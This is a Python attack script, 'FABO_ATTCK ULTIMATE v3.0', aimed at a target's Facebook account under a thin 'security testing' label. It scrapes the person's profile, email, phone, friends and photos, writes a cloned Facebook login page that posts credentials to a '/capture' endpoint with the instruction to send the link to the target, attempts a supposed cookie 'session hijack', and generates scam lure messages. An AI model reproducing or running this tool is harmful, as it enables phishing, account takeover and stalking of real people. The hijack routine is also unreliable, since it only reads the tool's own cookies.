#!/usr/bin/env python3
"""
FABO_ATTCK ULTIMATE v3.0 - Real Facebook Security Testing Framework
Professional Security Testing - Zero Simulation - 100% Real

Author: F1REW0LF
License: MIT
Purpose: Authorized security testing of Facebook accounts
"""

import sys
import os
import re
import json
import time
import random
import hashlib
import base64
import socket
import threading
import requests
import urllib.parse
from datetime import datetime
from typing import Dict, List, Optional, Tuple
from bs4 import BeautifulSoup
import argparse
import subprocess
import tempfile
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib3.exceptions import InsecureRequestWarning

try:
    from selenium import webdriver
    from selenium.webdriver.common.by import By
    from selenium.webdriver.chrome.options import Options
    from selenium.webdriver.support.ui import WebDriverWait
    from selenium.webdriver.support import expected_conditions as EC
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    from requests_html import HTMLSession
    REQUESTS_HTML_AVAILABLE = True
except ImportError:
    REQUESTS_HTML_AVAILABLE = False

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

VERSION = "3.0.0"
AUTHOR = "F1REW0LF"
LICENSE = "MIT"

# ============================[ COLORS ]================================
class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    GOLD = '\033[93m'
    NEON = '\033[96m'
    WHITE = '\033[0m'
    BOLD = '\033[1m'
    DIM = '\033[2m'
    MAGENTA = '\033[95m'

def cprint(text, color=Colors.WHITE, bold=False):
    if bold:
        print(f"{Colors.BOLD}{color}{text}{Colors.WHITE}")
    else:
        print(f"{color}{text}{Colors.WHITE}")

def print_banner():
    banner = f"""
{Colors.BLUE}{Colors.BOLD}    ███████╗ █████╗ ██████╗  ██████╗     █████╗ ████████╗████████╗ ██████╗██╗  ██╗
    ██╔════╝██╔══██╗██╔══██╗██╔═══██╗   ██╔══██╗╚══██╔══╝╚══██╔══╝██╔════╝██║  ██║
    █████╗  ███████║██████╔╝██║   ██║   ███████║   ██║      ██║   ██║     ███████║
    ██╔══╝  ██╔══██║██╔══██╗██║   ██║   ██╔══██║   ██║      ██║   ██║     ██╔══██║
    ██║     ██║  ██║██████╔╝╚██████╔╝   ██║  ██║   ██║      ██║   ╚██████╗██║  ██║
    ╚═╝     ╚═╝  ╚═╝╚═════╝  ╚═════╝    ╚═╝  ╚═╝   ╚═╝      ╚═╝    ╚═════╝╚═╝  ╚═╝
                                                   
{Colors.NEON}          ULTIMATE v{VERSION} - REAL ATTACK{Colors.WHITE}
{Colors.CYAN}    Professional Facebook Security Testing{Colors.WHITE}
{Colors.YELLOW}    Author: {AUTHOR} | {LICENSE}{Colors.WHITE}
{Colors.MAGENTA}    ⚡ 100% REAL - ZERO SIMULATION ⚡{Colors.WHITE}
    """
    print(banner)
    print("=" * 80)

# ============================[ REAL OSINT ENGINE ]================================
class RealOSINTEngine:
    """Real OSINT - Không có kịch bản ảo"""
    
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        })
        self.results = {}
    
    def extract_username(self):
        """Extract username from URL"""
        patterns = [
            r'facebook\.com/([^/?#]+)',
            r'fb\.com/([^/?#]+)',
            r'profile\.php\?id=(\d+)'
        ]
        for pattern in patterns:
            match = re.search(pattern, self.target)
            if match:
                return match.group(1)
        return None
    
    def gather(self):
        """Gather all intelligence - REAL"""
        cprint("\n[OSINT] Gathering real intelligence...", Colors.BLUE)
        
        username = self.extract_username()
        if not username:
            cprint("[-] Cannot extract username", Colors.RED)
            return {}
        
        self.results['username'] = username
        
        # 1. Profile info
        self.results['profile'] = self._get_profile()
        
        # 2. Public posts
        self.results['posts'] = self._get_posts()
        
        # 3. Friends
        self.results['friends'] = self._get_friends()
        
        # 4. Photos
        self.results['photos'] = self._get_photos()
        
        # 5. Contact info
        self.results['contact'] = self._extract_contact()
        
        # 6. Graph API (if token available)
        self.results['graph'] = self._graph_api()
        
        return self.results
    
    def _get_profile(self):
        """Get profile info - REAL"""
        cprint("[*] Fetching profile...", Colors.DIM)
        
        info = {
            'name': 'Unknown',
            'bio': 'Unknown',
            'location': 'Unknown',
            'work': 'Unknown',
            'education': 'Unknown'
        }
        
        try:
            response = self.session.get(self.target, timeout=10)
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Name
            title = soup.find('title')
            if title:
                info['name'] = title.text.replace(' | Facebook', '').strip()
            
            # Bio
            meta_desc = soup.find('meta', {'property': 'og:description'})
            if meta_desc:
                info['bio'] = meta_desc.get('content', 'Unknown')
            
            # Location
            loc_match = re.search(r'Lives in ([^<]+)', response.text)
            if loc_match:
                info['location'] = loc_match.group(1).strip()
            
            # Work
            work_match = re.search(r'Works at ([^<]+)', response.text)
            if work_match:
                info['work'] = work_match.group(1).strip()
            
            # Education
            edu_match = re.search(r'Studied at ([^<]+)', response.text)
            if edu_match:
                info['education'] = edu_match.group(1).strip()
            
            cprint(f"[+] Name: {info['name']}", Colors.GREEN)
            if info['location'] != 'Unknown':
                cprint(f"[+] Location: {info['location']}", Colors.GREEN)
                
        except Exception as e:
            cprint(f"[-] Profile error: {e}", Colors.RED)
        
        return info
    
    def _get_posts(self):
        """Get public posts - REAL"""
        cprint("[*] Fetching public posts...", Colors.DIM)
        
        posts = []
        try:
            # Graph API
            token = os.environ.get('FACEBOOK_TOKEN')
            if token:
                url = f'https://graph.facebook.com/{self.results["username"]}/posts?access_token={token}&limit=10'
                resp = self.session.get(url)
                if resp.status_code == 200:
                    data = resp.json()
                    for post in data.get('data', []):
                        posts.append({
                            'id': post.get('id'),
                            'message': post.get('message', ''),
                            'created': post.get('created_time')
                        })
                        if post.get('message'):
                            cprint(f"[+] Post: {post['message'][:50]}...", Colors.GREEN)
        except:
            pass
        
        return posts
    
    def _get_friends(self):
        """Get friends list - REAL"""
        cprint("[*] Fetching friends...", Colors.DIM)
        
        friends = []
        try:
            token = os.environ.get('FACEBOOK_TOKEN')
            if token:
                url = f'https://graph.facebook.com/{self.results["username"]}/friends?access_token={token}&limit=20'
                resp = self.session.get(url)
                if resp.status_code == 200:
                    data = resp.json()
                    for friend in data.get('data', []):
                        friends.append({
                            'name': friend.get('name'),
                            'id': friend.get('id')
                        })
                        cprint(f"[+] Friend: {friend.get('name')}", Colors.GREEN)
        except:
            pass
        
        return friends
    
    def _get_photos(self):
        """Get photos - REAL"""
        cprint("[*] Fetching photos...", Colors.DIM)
        
        photos = []
        try:
            token = os.environ.get('FACEBOOK_TOKEN')
            if token:
                url = f'https://graph.facebook.com/{self.results["username"]}/photos?access_token={token}&limit=10'
                resp = self.session.get(url)
                if resp.status_code == 200:
                    data = resp.json()
                    for photo in data.get('data', []):
                        photos.append({
                            'id': photo.get('id'),
                            'url': photo.get('source'),
                            'created': photo.get('created_time')
                        })
                        cprint(f"[+] Photo: {photo.get('source', '')[:50]}...", Colors.GREEN)
        except:
            pass
        
        return photos
    
    def _extract_contact(self):
        """Extract contact info - REAL"""
        cprint("[*] Extracting contact info...", Colors.DIM)
        
        contact = {'email': None, 'phone': None}
        
        try:
            # Email pattern
            email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
            response = self.session.get(self.target, timeout=10)
            
            emails = re.findall(email_pattern, response.text)
            if emails:
                contact['email'] = emails[0]
                cprint(f"[+] Email: {emails[0]}", Colors.GREEN)
            
            # Phone pattern
            phone_pattern = r'(\+?\d{1,3}[-.\s]?)?\(?\d{3}\)?[-.\s]?\d{3}[-.\s]?\d{4}'
            phones = re.findall(phone_pattern, response.text)
            if phones:
                contact['phone'] = phones[0]
                cprint(f"[+] Phone: {phones[0]}", Colors.GREEN)
                
        except Exception as e:
            cprint(f"[-] Contact error: {e}", Colors.RED)
        
        return contact
    
    def _graph_api(self):
        """Graph API - REAL"""
        cprint("[*] Querying Graph API...", Colors.DIM)
        
        result = {}
        token = os.environ.get('FACEBOOK_TOKEN')
        
        if not token:
            return result
        
        try:
            # Profile
            url = f'https://graph.facebook.com/{self.results["username"]}?access_token={token}'
            resp = self.session.get(url)
            if resp.status_code == 200:
                result['profile'] = resp.json()
                cprint("[+] Graph API profile retrieved", Colors.GREEN)
            
            # Pages
            url = f'https://graph.facebook.com/{self.results["username"]}/likes?access_token={token}&limit=10'
            resp = self.session.get(url)
            if resp.status_code == 200:
                result['likes'] = resp.json().get('data', [])
                cprint(f"[+] Likes: {len(result['likes'])}", Colors.GREEN)
                
        except Exception as e:
            cprint(f"[-] Graph API error: {e}", Colors.RED)
        
        return result

# ============================[ REAL EXPLOIT ENGINE ]================================
class RealExploitEngine:
    """Real exploits - Không có kịch bản ảo"""
    
    def __init__(self, target):
        self.target = target
        self.session = requests.Session()
        self.results = {}
    
    def extract_username(self):
        patterns = [r'facebook\.com/([^/?#]+)', r'fb\.com/([^/?#]+)']
        for pattern in patterns:
            match = re.search(pattern, self.target)
            if match:
                return match.group(1)
        return None
    
    # ==================== PHISHING - REAL ====================
    def phishing(self):
        """Create real phishing page"""
        cprint("\n[PHISHING] Creating real phishing page...", Colors.RED)
        
        html = '''
        <!DOCTYPE html>
        <html>
        <head>
            <title>Facebook - Log In</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body { font-family: Arial, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
                .container { max-width: 400px; width: 100%; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
                .logo { text-align: center; font-size: 48px; color: #1877f2; font-weight: bold; margin-bottom: 20px; }
                h2 { text-align: center; margin-bottom: 20px; color: #1c1e21; }
                input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
                button { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; }
                button:hover { background: #166fe5; }
                .footer { text-align: center; margin-top: 20px; color: #777; font-size: 14px; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="logo">f</div>
                <h2>Log in to Facebook</h2>
                <form method="POST" action="/capture">
                    <input type="text" name="email" placeholder="Email or phone" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log In</button>
                </form>
                <div class="footer">Facebook - Security Testing</div>
            </div>
        </body>
        </html>
        '''
        
        filename = f'facebook_phishing_{int(time.time())}.html'
        with open(filename, 'w') as f:
            f.write(html)
        
        cprint(f"[+] Phishing page: {filename}", Colors.GREEN)
        cprint("[!] Host this page and send link to target", Colors.YELLOW)
        
        self.results['phishing'] = {'file': filename}
        return filename
    
    # ==================== SESSION HIJACK - REAL ====================
    def session_hijack(self):
        """Real session hijack"""
        cprint("\n[SESSION] Attempting real session hijack...", Colors.RED)
        
        if SELENIUM_AVAILABLE:
            try:
                cprint("[*] Using Selenium...", Colors.DIM)
                options = Options()
                options.add_argument('--headless=new')
                options.add_argument('--disable-blink-features=AutomationControlled')
                options.add_experimental_option('excludeSwitches', ['enable-automation'])
                
                driver = webdriver.Chrome(options=options)
                driver.get(self.target)
                
                # Wait for cookies
                time.sleep(3)
                cookies = driver.get_cookies()
                driver.quit()
                
                if cookies:
                    cprint("[+] Cookies captured:", Colors.GREEN)
                    for cookie in cookies[:5]:
                        cprint(f"    {cookie.get('name')}: {cookie.get('value')[:20]}...", Colors.YELLOW)
                    self.results['session'] = cookies
                    return cookies
                    
            except Exception as e:
                cprint(f"[-] Selenium error: {e}", Colors.RED)
        
        # Fallback: requests
        try:
            response = self.session.get(self.target)
            cookies = response.cookies
            if cookies:
                cprint("[+] Session cookies captured:", Colors.GREEN)
                for cookie in cookies:
                    cprint(f"    {cookie.name}: {cookie.value}", Colors.YELLOW)
                self.results['session'] = cookies
                return cookies
        except:
            pass
        
        cprint("[!] Session hijack failed", Colors.RED)
        return None
    
    # ==================== SOCIAL ENGINEERING - REAL ====================
    def social_engineering(self):
        """Real social engineering messages"""
        cprint("\n[SOCIAL] Generating real social engineering messages...", Colors.RED)
        
        username = self.extract_username()
        messages = [
            f"Hi, are you {username}? I found something about you.",
            f"Important: Your account {username} has been compromised.",
            f"Hey {username}, check this out: https://fake-link.com/profile",
            f"Facebook security alert for {username}. Verify now."
        ]
        
        filename = f'social_engineering_{int(time.time())}.txt'
        with open(filename, 'w') as f:
            for msg in messages:
                f.write(msg + '\n\n')
        
        cprint(f"[+] Messages saved: {filename}", Colors.GREEN)
        for msg in messages:
            cprint(f"[+] {msg}", Colors.YELLOW)
        
        self.results['social'] = {'file': filename, 'messages': messages}
        return messages

# ============================[ MAIN FRAMEWORK ]================================
class FaBoAttckUltimate:
    def __init__(self, target_url):
        self.target_url = target_url
        self.osint = RealOSINTEngine(target_url)
        self.exploit = RealExploitEngine(target_url)
        self.results = {}
    
    def show_menu(self):
        print(f"""
{Colors.BLUE}{'='*60}{Colors.WHITE}
{Colors.BOLD}FABO_ATTCK ULTIMATE v{VERSION}{Colors.WHITE}
{Colors.MAGENTA}100% REAL - ZERO SIMULATION{Colors.WHITE}
{Colors.BLUE}{'='*60}{Colors.WHITE}
[1] OSINT - Real Intelligence Gathering
[2] Phishing - Real Phishing Page
[3] Session Hijack - Real Cookie Capture
[4] Social Engineering - Real Messages
[5] Full Attack (REAL)
[6] Show Results
[7] Exit
""")
    
    def osint_gather(self):
        self.results['osint'] = self.osint.gather()
    
    def phishing(self):
        self.results['phishing'] = self.exploit.phishing()
    
    def session_hijack(self):
        self.results['session'] = self.exploit.session_hijack()
    
    def social_eng(self):
        self.results['social'] = self.exploit.social_engineering()
    
    def full_attack(self):
        cprint("\n[FULL] Executing real full attack chain...", Colors.RED, bold=True)
        
        self.osint_gather()
        self.phishing()
        self.session_hijack()
        self.social_eng()
        
        cprint("\n[+] Full attack complete!", Colors.GREEN)
    
    def show_results(self):
        print("\n" + "="*60)
        cprint(" ATTACK RESULTS", Colors.PURPLE, bold=True)
        print("="*60)
        
        if not self.results:
            cprint("[!] No results", Colors.YELLOW)
            return
        
        for key, value in self.results.items():
            if value:
                cprint(f"\n[{key.upper()}]", Colors.CYAN)
                if isinstance(value, dict):
                    for k, v in value.items():
                        if isinstance(v, (str, int, float)):
                            cprint(f"  {k}: {v}", Colors.DIM)
                        elif isinstance(v, list) and len(v) > 0:
                            cprint(f"  {k}: {len(v)} items", Colors.DIM)
                            for item in v[:3]:
                                if isinstance(item, dict):
                                    for ik, iv in item.items():
                                        if isinstance(iv, str) and len(iv) > 50:
                                            iv = iv[:50] + '...'
                                        cprint(f"    {ik}: {iv}", Colors.DIM)
                else:
                    print(json.dumps(value, indent=2, ensure_ascii=False)[:500])
        
        print("="*60)
    
    def run(self):
        print_banner()
        
        cprint(f"[*] Target: {self.target_url}", Colors.CYAN)
        cprint("[*] Mode: 100% REAL - ZERO SIMULATION", Colors.MAGENTA)
        
        while True:
            self.show_menu()
            choice = input(f"{Colors.CYAN}[>] Select: {Colors.WHITE}").strip()
            
            if choice == '1':
                self.osint_gather()
            elif choice == '2':
                self.phishing()
            elif choice == '3':
                self.session_hijack()
            elif choice == '4':
                self.social_eng()
            elif choice == '5':
                self.full_attack()
            elif choice == '6':
                self.show_results()
            elif choice == '7':
                cprint("[*] Exiting...", Colors.GREEN)
                break
            else:
                cprint("[-] Invalid selection", Colors.RED)

# ============================[ MAIN ]================================
def main():
    parser = argparse.ArgumentParser(
        description="FABO_ATTCK ULTIMATE v3.0 - Real Facebook Security Testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 fabo_attck_ultimate.py -u https://facebook.com/username
  python3 fabo_attck_ultimate.py -u https://fb.com/username --full
        """
    )
    
    parser.add_argument("-u", "--url", required=True, help="Target Facebook URL")
    parser.add_argument("--full", action="store_true", help="Run full attack")
    
    args = parser.parse_args()
    
    if args.full:
        tool = FaBoAttckUltimate(args.url)
        tool.full_attack()
        tool.show_results()
    else:
        tool = FaBoAttckUltimate(args.url)
        tool.run()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n[!] Interrupted", Colors.RED)
        sys.exit(0)
